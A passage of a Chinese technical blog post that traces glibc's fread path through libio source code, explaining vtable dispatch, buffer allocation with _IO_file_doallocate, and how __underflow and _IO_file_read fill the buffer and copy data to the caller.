vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">                       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br></pre></td></tr></table></figure><p>盖亚，fucking macro</p><blockquote><p><code>((struct _IO_FILE_plus)&#123;&#125;)</code> 创建了一个匿名的 <code>_IO_FILE_plus</code> 结构体，这个结构体里面只有一个 <code>vtable</code> 成员，其余成员都是默认值。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))-&gt;__xsgetn) (fp, data, n);</span><br></pre></td></tr></table></figure><p><mark><strong>最终调用虚表里的__xsgetn指向的_IO_file_xsgetn</strong><mark></mark></mark></p><hr><p><strong>libio&#x2F;fileops.c</strong></p><p>_IO_file_xsgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn(_IO_FILE* fp, <span class="type">void</span>* data, _IO_size_t n) &#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span>* s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (want &lt;= have) &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">      fp-&gt;_IO_read_ptr += want;</span><br><span class="line">      want = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">        s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">        s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        want -= have;</span><br><span class="line">        fp-&gt;_IO_read_ptr += have;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_in_backup(fp)) &#123;</span><br><span class="line">        _IO_switch_to_main_get_area(fp);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">         the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">         the user buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="type">size_t</span>)(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base) &#123;</span><br><span class="line">        _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">        <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">          count -= want % block_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD(fp, s, count);</span><br><span class="line">      <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">          fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      s += count;</span><br><span class="line">      want -= count;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><h2 id="初始化输入缓冲区"><a href="#初始化输入缓冲区" class="headerlink" title="初始化输入缓冲区"></a>初始化输入缓冲区</h2><p>先检测是否有备份的缓冲区，有则将缓冲区释放掉，并把_IO_IN_BACKUP位置空<br>当程序需要从一个IO流中读取下一个字符时，它通常会从缓冲区中读取一个字符，如果缓冲区为空，则会触发一个IO操作，将更多的数据读入缓冲区中。但是在某些情况下，程序需要读取缓冲区中的备用字符，而不是从IO流中读取。此时，_IO_IN_BACKUP标志就会被设置，以指示下一个字符是备用字符而不是IO流中的字符。</p><p>然后调用_IO_doallocbuf(buf)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>检测值后调用_IO_DOALLOCATE</p><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _IO_DOALLOCATE(FP)  JUMP0(__doallocate , FP)</span></span><br></pre></td></tr></table></figure><p><mark>根据前面的经验调用虚表中的**__doallocate<strong>指向的</strong>_IO_file_doallocate**函数<mark></mark></mark></p><p><strong>libio&#x2F;filedoalloc.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate(_IO_FILE* fp) &#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="type">char</span>* p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect(_IO_SYSSTAT(fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (S_ISCHR(st.st_mode)) &#123;</span><br><span class="line">      <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">        DEV_TTY_P(&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        local_isatty(fp-&gt;_fileno))</span><br><span class="line">        fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">      size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb(fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>struct stat64是一个在UNIX和Linux系统中用于存储文件或目录元数据的数据结构。它的定义通常在头文件&lt;sys&#x2F;stat.h&gt;中，并包含以下成员：</p><ol><li>dev：文件所在设备的设备号</li><li>ino：文件的i节点号</li><li>mode：文件的访问权限和类型（如普通文件、目录、符号链接等）</li><li>nlink：文件的硬链接数</li><li>uid：文件所有者的用户ID</li><li>gid：文件所有者所在的组ID</li><li>rdev：如果文件是设备文件，则为设备号</li><li>size：文件大小（以字节为单位）</li><li>blksize：文件系统块大小（以字节为单位）</li><li>blocks：文件占用的块数（以文件系统块为单位）</li><li>atime：文件上一次被访问的时间</li><li>mtime：文件上一次修改的时间</li><li>ctime：文件上一次状态改变的时间（如文件所有者或权限的改变</li></ol><p><mark><strong>首先是_IO_SYSSTAT调用虚表中的__stat指向的_IO_file_stat函数</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSTAT(FP, BUF) JUMP1 (__stat, FP, BUF)</span></span><br></pre></td></tr></table></figure><p>系统调用SYS_fstat修改<strong>st.blksize</strong>大小</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331170443379.png" alt="image-20230331170443379"></p><p>然后申请了一块内存，调用<strong>libio&#x2F;genops.c</strong>中的**_IO_setb**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb(_IO_FILE* f, <span class="type">char</span>* b, <span class="type">char</span>* eb, <span class="type">int</span> a) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span>(f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_setb)</span><br></pre></td></tr></table></figure><p>如果f的_IO_buf_base存在，而且标志位的_IO_USER_BUF不是用户分配缓冲区，释放这个缓冲区</p><p>设置_IO_buf_base为刚刚malloc的堆为缓冲区，_IO_buf_end设置为堆块开始+堆块大小，并设置_flags为用户分配缓冲区</p><blockquote><p>#define _IO_USER_BUF 1 &#x2F;* User owns buffer; don’t delete it on close. *&#x2F;</p><p>_IO_USER_BUF用于指示文件流的缓冲区是由用户分配的还是由标准 I&#x2F;O 库分配的。如果 <code>_IO_USER_BUF</code> 标志位未被设置，那么表示文件流的缓冲区是由标准 I&#x2F;O 库分配的。在这种情况下，标准 I&#x2F;O 库会在关闭文件流时自动释放缓冲区。如果 <code>_IO_USER_BUF</code> 标志位被设置，那么表示文件流的缓冲区是由用户分配的。在这种情况下，标准 I&#x2F;O 库不会尝试释放缓冲区 </p></blockquote><hr><h2 id="往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存"><a href="#往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存" class="headerlink" title="往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存"></a>往缓冲区里写入流指针所标记的文件数据，并把数据写入目标内存</h2><p>回到_IO_file_xsgetn然后进行我们fread函数的第三个参数count次的循环</p><p>前面条件都不符合来到<code> if (fp-&gt;_IO_buf_base&amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</code></p><h4 id="want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-时-即fread一次想要读取的数据小于4k"><a href="#want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-时-即fread一次想要读取的数据小于4k" class="headerlink" title="want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)时,即fread一次想要读取的数据小于4k"></a><strong>want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)时,即fread一次想要读取的数据小于4k</strong></h4><p>调用<strong>libio&#x2F;genops.c</strong> __underflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__underflow)</span><br></pre></td></tr></table></figure><p><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>检测缓冲区是否有数据，有数据可以直接返回读取</p><p>否则调用_IO_UNDERFLOW</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_UNDERFLOW(FP) JUMP0 (__underflow, FP)</span></span><br></pre></td></tr></table></figure><p><mark><strong>即虚表中的__underflow字段，对应_IO_new_file_underflow函数</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<span class="comment">//会先检测是否存在_IO_NO_READS标志，</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<span class="comment">//检测输入缓冲区里存在数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_doallocbuf (fp);<span class="comment">//如果没有输入缓冲区，则再次调用_IO_doallocbuf分配输入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">      _IO_flush_all_linebuffered ();</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment">     required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment">     traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment">     not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment">     explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">      == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">    _IO_OVERFLOW (_IO_stdout, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (_IO_stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"><span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;</span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment">     handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment">     unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会先检测是否存在_IO_NO_READS标志，输入缓冲区里存在数据</p><p>如果没有输入缓冲区，则再次调用_IO_doallocbuf分配输入缓冲区</p><p>设置_IO_read_base，_IO_read_ptr，_IO_read_end，_IO_write_base，_IO_write_ptr，_IO_write_end都为filedoalloc.c中申请的堆的缓冲区</p><img src="/2023/03/31/IO-FILE-fread/image-20230331225339043.png" alt="image-20230331225339043" style="zoom:67%;"><p>调用**_IO_SYSREAD<strong>函数尝试从</strong>fp<strong>中读</strong>_IO_buf_end - _IO_buf_base**数据到_IO_buf_base</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSREAD(FP, DATA, LEN) JUMP2 (__read, FP, DATA, LEN)</span></span><br></pre></td></tr></table></figure><p><mark><strong>_IO_SYSREAD 调用虚表里的_&#x2F;read指向的libio&#x2F;fileops.c的_IO_file_read</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_file_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">      ? read_not_cancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">      : read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_read)</span><br></pre></td></tr></table></figure><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230514508.png" alt="image-20230331230514508"></p><p>把文件描述符_fileno代表的文件数据读入到_IO_buf_base</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331230607785.png" alt="image-20230331230607785"></p><p>移动_IO_read_end位置,来标记读入数据的终点</p><img src="/2023/03/31/IO-FILE-fread/image-20230331231456814.png" alt="image-20230331231456814" style="zoom:67%;"><p>再次回到_IO_file_xsgetn的while循环</p><p>这次会进入第一条分支</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232055813.png" alt="image-20230331232055813"></p><p>通过memcpy拷贝内存到fopen函数的第一个参数buffer</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232240158.png" alt="image-20230331232240158"></p><p>改变_IO_read_ptr指向区域</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331232540181.png" alt="image-20230331232540181"></p><p>一直循环到count为0</p><h4 id="want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base）时，即fread一次想要读取的数据大于4k"><a href="#want-gt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base）时，即fread一次想要读取的数据大于4k" class="headerlink" title="want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base）时，即fread一次想要读取的数据大于4k"></a>want &gt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base）时，即fread一次想要读取的数据大于4k</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">_IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">count = want;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">&#123;</span><br><span class="line">    _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">    <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">        count -= want % block_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = _IO_SYSREAD (fp, s, count);</span><br><span class="line"><span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s += count;</span><br><span class="line">want -= count;</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro展开是这样的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base, (fp)-&gt;_IO_write_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>也是把结构体里的<strong>read</strong>和<strong>write</strong>相关<strong>6</strong>个指针均初始化为**_IO_buf_base**</p><p>因为此时申请的缓冲区最大，一个页面4k，所以block_size为4k，调用_IO_SYSREAD，这一次不经过缓冲区，直接把数据放入我们fopen指定的第一个参数里，s +&#x3D; count;<br>want -&#x3D; 